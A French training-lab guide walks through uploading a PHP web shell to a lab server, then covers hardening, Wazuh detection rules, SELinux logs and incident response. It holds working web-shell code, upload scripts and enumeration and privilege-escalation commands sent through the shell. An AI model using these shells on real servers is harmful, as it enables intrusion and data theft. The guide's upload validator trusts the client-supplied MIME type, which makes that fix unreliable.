# Attaque 3 : Upload de fichier malveillant (Web Shell)

**Durée estimée :** 1 heure  
**Niveau :** Intermédiaire  
**Objectif :** Uploader un fichier malveillant (PHP shell) sur le serveur web pour obtenir une exécution de commandes

---

## 📋 Objectifs pédagogiques

À l'issue de cette attaque, vous comprendrez :

- Les risques des uploads non validés
- Comment SELinux protège contre l'exécution de fichiers
- Comment les IDS détectent les fichiers malveillants
- L'importance de la validation côté serveur
- Comment réagir à une compromission web

---

## 🎯 Scénario réaliste

L'attaquant a découvert une fonctionnalité d'upload sur le site web (formulaire de contact, galerie, etc.). Il tente maintenant d'uploader un **Web Shell** pour :
- Exécuter des commandes
- Énumérer le système
- Installer une backdoor
- Escalader les privilèges

---

## 🛠️ Prérequis

**Sur la machine attaquante :**
- curl ou wget
- Terminal
- Accès web à 192.168.1.100

**Sur la VM Web :**
- Nginx configuré avec répertoire d'upload
- PHP installé (ou simulé)
- SELinux actif (Enforcing)

**Configuration attendue du serveur :**
```
Document root: /var/www/html
Upload dir: /var/www/uploads
Permissions: 755
```

---

## ⚙️ Étape 1 : Créer le fichier malveillant (10 min)

### Objectif
Générer un Web Shell PHP basique pour l'attaque.

### Option 1 : Shell PHP simple

```bash
# Créer un shell PHP basique
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<form method="GET">
    <input type="text" name="cmd" placeholder="Commande">
    <input type="submit" value="Exécuter">
</form>
EOF

# Afficher le contenu
cat /tmp/shell.php
```

### Option 2 : Shell PHP encodé (anti-détection)

```bash
# Version plus discrète avec base64
cat > /tmp/shell_encoded.php << 'EOF'
<?php
$cmd = isset($_GET['c']) ? $_GET['c'] : '';
if($cmd) {
    echo "<pre>" . shell_exec($cmd) . "</pre>";
}
?>
EOF

cat /tmp/shell_encoded.php
```

### Output attendu

```php
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<form method="GET">
    <input type="text" name="cmd" placeholder="Commande">
    <input type="submit" value="Exécuter">
</form>
```

---

## ⚙️ Étape 2 : Trouver un point d'upload (10 min)

### Objectif
Identifier où uploader le fichier sur la VM Web.

### Reconnaissance du site

```bash
# Récupérer la page web
curl -s http://192.168.1.100/ | grep -i "upload\|form\|file"

# Chercher un formulaire de contact
curl -s http://192.168.1.100/contact.html | grep -i "upload"

# Chercher des répertoires publics
curl -I http://192.168.1.100/uploads/
curl -I http://192.168.1.100/files/
curl -I http://192.168.1.100/media/
curl -I http://192.168.1.100/tmp/
```

### Output attendu

```html
HTTP/1.1 200 OK
Server: nginx/1.20.1
Content-Type: text/html

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <button type="submit">Upload</button>
</form>

<!-- Répertoire uploads existe -->
```

---

## ⚙️ Étape 3 : Uploader le fichier malveillant (10 min)

### Objectif
Envoyer le Web Shell au serveur.

### Méthode 1 : Avec curl (POST multipart)

```bash
# Upload simple
curl -F "file=@/tmp/shell.php" http://192.168.1.100/upload.php

# Upload vers un répertoire spécifique
curl -F "file=@/tmp/shell.php" \
     -F "folder=uploads" \
     http://192.168.1.100/upload.php

# Avec header personnalisé
curl -F "file=@/tmp/shell.php" \
     -H "User-Agent: Mozilla/5.0" \
     -H "X-Forwarded-For: 8.8.8.8" \
     http://192.168.1.100/upload.php -v
```

### Output attendu

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   512  100   123  100   389      45     145  0:00:03  0:00:00  0:00:03   180
File uploaded successfully!
Location: /uploads/shell.php
```

### Méthode 2 : Avec wget

```bash
wget --post-file=/tmp/shell.php \
     http://192.168.1.100/upload.php

# Vérifier la réponse
wget -q -O - http://192.168.1.100/uploads/shell.php
```

### Méthode 3 : Avec Python (plus flexible)

```python
import requests
import sys

url = "http://192.168.1.100/upload.php"
files = {'file': open('/tmp/shell.php', 'rb')}

try:
    response = requests.post(url, files=files)
    print(f"Status: {response.status_code}")
    print(f"Response: {response.text}")
    
    # Vérifier si upload réussi
    if response.status_code == 200:
        print("[+] Upload successful!")
        print("[+] Shell location: http://192.168.1.100/uploads/shell.php")
except Exception as e:
    print(f"[-] Error: {e}")
```

---

## ⚙️ Étape 4 : Exécuter le Web Shell (15 min)

### Objectif
Utiliser le Web Shell pour exécuter des commandes.

### Tester l'accès

```bash
# Vérifier que le fichier a été uploadé
curl -s http://192.168.1.100/uploads/shell.php

# Output attendu :
# <form method="GET">
#     <input type="text" name="cmd" placeholder="Commande">
#     <input type="submit" value="Exécuter">
# </form>
```

### Exécuter des commandes

```bash
# Commande basique
curl -s "http://192.168.1.100/uploads/shell.php?cmd=whoami"
# Sortie attendue: www-data ou nginx

# Lister répertoires
curl -s "http://192.168.1.100/uploads/shell.php?cmd=ls%20-la%20/var/www"

# Voir les infos système
curl -s "http://192.168.1.100/uploads/shell.php?cmd=uname%20-a"

# Vérifier les users
curl -s "http://192.168.1.100/uploads/shell.php?cmd=cat%20/etc/passwd"

# Enumération réseau
curl -s "http://192.168.1.100/uploads/shell.php?cmd=ifconfig"
curl -s "http://192.168.1.100/uploads/shell.php?cmd=netstat%20-tlnp"
```

### Output attendu

```
www-data
total 24
-rw-r--r-- 1 root root 4096 Jan 15 10:00 .
-rw-r--r-- 1 root root 4096 Jan 15 09:00 ..
-rw-r--r-- 1 www-data www-data 512 Jan 15 11:30 shell.php

Linux web 4.18.0-477 #1 SMP Rocky 4.18.0 x86_64 GNU/Linux

root:x:0:0:root:/root:/bin/bash
student:x:1000:1000:student:/home/student:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### Escalade des privilèges

```bash
# Vérifier si www-data peut faire sudo
curl -s "http://192.168.1.100/uploads/shell.php?cmd=sudo%20-l"

# Trouver des fichiers modifiables
curl -s "http://192.168.1.100/uploads/shell.php?cmd=find%20/%20-writable%202>/dev/null"

# Vérifier les processus en cours
curl -s "http://192.168.1.100/uploads/shell.php?cmd=ps%20aux"

# Vérifier les services
curl -s "http://192.168.1.100/uploads/shell.php?cmd=systemctl%20list-units"
```

---

## 🔍 Rôle 1 : Administrateur système & hardening

### Ce que tu dois observer

#### 1. Vérifier les permissions d'upload

```bash
# Vérifier répertoire uploads
sudo ls -la /var/www/uploads/

# Sortie attendue :
# drwxr-xr-x 2 www-data www-data 4096 Jan 15 11:30 uploads
# -rw-r--r-- 1 www-data www-data  512 Jan 15 11:30 shell.php

# Voir qui peut exécuter
sudo stat /var/www/uploads/shell.php
```

#### 2. Vérifier SELinux (protection)

```bash
# Voir le contexte SELinux
sudo ls -laZ /var/www/uploads/

# Sortie attendue :
# -rw-r--r-- root root system_u:object_r:httpd_sys_rw_content_t:s0 shell.php

# Vérifier les violations SELinux
sudo tail -50 /var/log/audit/audit.log | grep -i denied

# Sortie attendue :
# type=AVC msg=audit(1705324800.123:456): avc:  denied  { execute } for ...
# selinux_denied_execute, policy_violation
```

#### 3. Vérifier la configuration Nginx

```bash
# Config upload
sudo cat /etc/nginx/nginx.conf | grep -A5 "client_max_body_size"

# Sortie attendue :
# client_max_body_size 10M;

# Vérifier les restrictions de type MIME
sudo cat /etc/nginx/conf.d/upload.conf | grep -i types
```

#### 4. Mettre en place des protections

```bash
# 1. Restreindre les extensions autorisées
sudo tee /etc/nginx/conf.d/security.conf << 'EOF'
# Bloquer l'exécution de scripts dans /uploads
location /uploads/ {
    location ~ \.(php|phtml|php3|php4|php5|phtml)$ {
        deny all;
    }
    alias /var/www/uploads/;
}
EOF

# 2. Restreindre les permissions
sudo chmod 755 /var/www/uploads
sudo chmod 644 /var/www/uploads/*

# 3. Activer SELinux
sudo semanage fcontext -a -t httpd_sys_content_t "/var/www/uploads(/.*)?"
sudo restorecon -Rv /var/www/uploads/

# Redémarrer Nginx
sudo systemctl restart nginx
```

---

## 🛡️ Rôle 2 : SOC / Logs / Détection

### Logs web attendus

#### Nginx access logs

**Fichier :** `/var/log/nginx/access.log`

```
192.168.1.50 - - [15/Jan/2024:11:35:20 +0100] "POST /upload.php HTTP/1.1" 200 145 "-" "curl/7.68.0"
192.168.1.50 - - [15/Jan/2024:11:35:21 +0100] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200 512 "-" "curl/7.68.0"
192.168.1.50 - - [15/Jan/2024:11:35:22 +0100] "GET /uploads/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1024 "-" "curl/7.68.0"
192.168.1.50 - - [15/Jan/2024:11:35:25 +0100] "GET /uploads/shell.php?cmd=find%20/%20-writable HTTP/1.1" 200 2048 "-" "curl/7.68.0"
```

#### Logs SELinux

**Fichier :** `/var/log/audit/audit.log`

```
type=AVC msg=audit(1705324520.123:789): avc:  denied  { execute } for  pid=12345 comm="php" name="shell.php" dev="dm-0" ino=987654 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:httpd_sys_rw_content_t:s0 tclass=file permissive=0
type=EXECVE msg=audit(1705324521.124:790): argc=3 a0="/usr/bin/php" a1="-r" a2="system('whoami')"
type=SYSCALL msg=audit(1705324521.124:790): arch=c000003e syscall=59 success=no exit=-13 a0=7f7f7f7f a1=7f7f7f80 a2=0 a3=0 items=0 ppid=54321 pid=12345 auid=33 uid=33 gid=33 euid=33 egid=33 fsuid=33 fsgid=33 tty=(none) ses=1 comm="php" exe="/usr/bin/php7.4" key="malware_detection"
```

### Règles Wazuh de détection

**Ajouter au fichier :** `/var/ossec/etc/rules/web_anomalies.xml`

```xml
<group name="web_uploads,malware,">
  <!-- Détection upload PHP -->
  <rule id="100400" level="7">
    <if_matched_sid>31601,31603</if_matched_sid>
    <regex>\.php|\.phtml|\.php3|\.php4|\.php5</regex>
    <description>PHP file uploaded detected</description>
    <group>web_uploads</group>
  </rule>

  <!-- Détection exécution de commandes -->
  <rule id="100401" level="9">
    <if_matched_sid>31601,31603</if_matched_sid>
    <regex>cmd=|exec|system|shell_exec|passthru|eval</regex>
    <description>Possible web shell execution attempt</description>
    <group>malware,web_shell</group>
  </rule>

  <!-- Détection énumération système -->
  <rule id="100402" level="8">
    <if_matched_sid>31601</if_matched_sid>
    <regex>cmd=(whoami|id|uname|cat /etc/passwd|ifconfig|netstat)</regex>
    <description>System enumeration via web shell</description>
    <group>lateral_movement,malware</group>
  </rule>

  <!-- Alerte SELinux violation -->
  <rule id="100403" level="9">
    <if_matched_sid>100003</if_matched_sid>
    <regex>denied.*execute.*shell</regex>
    <description>SELinux blocked malicious execution</description>
    <group>selinux_protection,malware</group>
  </rule>
</group>
```

### Dashboard Wazuh

```
INCIDENT ALERT - WEB SHELL DETECTED

Severity: CRITICAL 🔴
Rule: 100401 - Web Shell Execution Attempt
Source IP: 192.168.1.50
Target: 192.168.1.100 (Web Server)

Indicators:
✓ PHP file uploaded to /uploads/
✓ Web shell parameters detected (cmd=)
✓ System enumeration commands executed
✓ SELinux denied execution (PROTECTED)

Timeline:
- 11:35:20 - Upload detected
- 11:35:21 - Web shell accessed
- 11:35:25 - System enumeration started
- 11:35:30 - SELinux blocked execution

Status: ACTIVE - UNDER INVESTIGATION
```

---

## 📊 Rôle 3 : Supervision & Incident Response

### Anomalies à surveiller

#### Zabbix/Grafana Metrics

```
HTTP 200 Responses to /uploads/:
Value: 5+ requests in 1 min
Threshold: Normal = 0
Status: CRITICAL

File Upload Activity:
Value: 3 uploads in 5 min
Threshold: Normal < 1/day
Status: WARNING

Web Process CPU Usage:
Value: 85%
Threshold: Normal < 30%
Status: CRITICAL
```

### Playbook d'incident response

#### Étape 1 : Confirmer la compromission

```bash
# Vérifier le fichier uploadé
sudo ls -la /var/www/uploads/ | grep shell

# Analyser le fichier
sudo file /var/www/uploads/shell.php
sudo cat /var/www/uploads/shell.php | head -5

# Vérifier les logs
sudo tail -20 /var/log/nginx/access.log | grep "shell.php"

# Vérifier les violations SELinux
sudo ausearch -m AVC -ts recent | grep shell
```

#### Étape 2 : Containment (Confinement)

```bash
# 1. Isoler le fichier malveillant
sudo mv /var/www/uploads/shell.php /tmp/evidence_shell.php

# 2. Stopper le web server temporairement
sudo systemctl stop nginx

# 3. Vérifier les autres fichiers suspects
sudo find /var/www -name "*.php" -mtime -1

# 4. Sauvegarder les preuves
sudo tar -czf /tmp/web_evidence.tar.gz /var/www/uploads/ /var/log/nginx/

# 5. Redémarrer le service
sudo systemctl start nginx
```

#### Étape 3 : Analyser et documenter

```bash
# Générer un rapport d'incident
cat > /tmp/web_shell_incident.md << 'EOF'
# Incident Report: Web Shell Upload

## Summary
Attacker uploaded malicious PHP file allowing remote code execution

## Timeline
- **Detection:** 2024-01-15 11:35:20
- **Response:** 2024-01-15 11:35:45
- **Containment:** 2024-01-15 11:36:00

## Attack Details
- **File:** shell.php (512 bytes)
- **Location:** /var/www/uploads/
- **Functionality:** Remote command execution
- **Commands Executed:** whoami, id, cat /etc/passwd, find

## Impact Assessment
- **Confidentiality:** HIGH (sensitive files accessed)
- **Integrity:** HIGH (potential for malware)
- **Availability:** MEDIUM (web service degraded)

## Detection & Response
- ✅ Wazuh rule 100401 triggered immediately
- ✅ SELinux prevented execution (enforcing mode)
- ✅ File isolated and preserved for forensics
- ✅ Web service restarted cleanly

## Lessons Learned
1. Implement strict file upload validation
2. Configure web server to deny PHP execution in upload dirs
3. Keep SELinux in enforcing mode
4. Monitor for unauthorized file uploads
5. Regular security scanning of web directories

**Status:** RESOLVED - No further compromise detected
EOF

cat /tmp/web_shell_incident.md
```

#### Étape 4 : Prévention future

```bash
# Script de durcissement upload
cat > /tmp/harden_uploads.sh << 'EOF'
#!/bin/bash

# Harden uploads directory
sudo chmod 755 /var/www/uploads
sudo chmod 644 /var/www/uploads/*

# Block PHP execution in uploads
sudo cat > /etc/nginx/conf.d/block_uploads.conf << 'NGINX'
location ~* ^/uploads/.*\.php$ {
    deny all;
}

location /uploads/ {
    try_files $uri =404;
    autoindex off;
}
NGINX

# Add file type validation
sudo cat > /var/www/html/upload_validator.php << 'PHP'
<?php
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$max_size = 5000000;

if ($_FILES['file']['size'] > $max_size) {
    die('File too large');
}

if (!in_array($_FILES['file']['type'], $allowed_types)) {
    die('Invalid file type');
}

// Safe upload
move_uploaded_file($_FILES['file']['tmp_name'], 
                   '/var/www/uploads/' . basename($_FILES['file']['name']));
?>
PHP

# Restart Nginx
sudo systemctl restart nginx
EOF

chmod +x /tmp/harden_uploads.sh
sudo /tmp/harden_uploads.sh
```

---

## ✅ Checklist de validation

### Point 1 : Attaque exécutée
- [ ] Web Shell créé et uploadé
- [ ] Shell PHP accessible via HTTP
- [ ] Au moins 3 commandes exécutées via shell

### Point 2 : Détection confirmée
- [ ] Upload détecté dans Wazuh (rule 100400+)
- [ ] Web shell exécution détectée
- [ ] SELinux a bloqué/enregistré l'exécution

### Point 3 : Réaction confirmée
- [ ] Fichier malveillant isolé/supprimé
- [ ] Incident documenté et rapporté
- [ ] Service web fonctionnel et sécurisé

---

## 📝 Commandes utiles - Mémo rapide

```bash
# Créer un web shell
echo '<?php system($_GET["c"]); ?>' > shell.php

# Uploader le fichier
curl -F "file=@shell.php" http://192.168.1.100/upload.php

# Exécuter des commandes
curl "http://192.168.1.100/uploads/shell.php?cmd=whoami"

# Vérifier les uploads
ls -la /var/www/uploads/

# Voir les logs
sudo tail -f /var/log/nginx/access.log

# Analyser avec Wazuh
sudo grep "shell.php" /var/ossec/logs/alerts.log
```

---

## 🔗 Références internes

- [02_bruteforce_ssh.md](./02_bruteforce_ssh.md) → Attaque précédente
- [04_elevation_privileges.md](./04_elevation_privileges.md) → Prochaine attaque
- [README.md](../README.md) → Retour au projet

---

## 💡 Points clés à retenir

1. **Validez TOUS les uploads** → Côté serveur, pas client
2. **Nunca ejecute scripts en directories de uploads** → Restringuez les permissions
3. **SELinux est votre sauvegarde** → Ne le désactivez jamais
4. **Les logs contiennent tout** → Analysez-les en temps réel
5. **La réaction doit être IMMÉDIATE** → Isoler, documenter, corriger

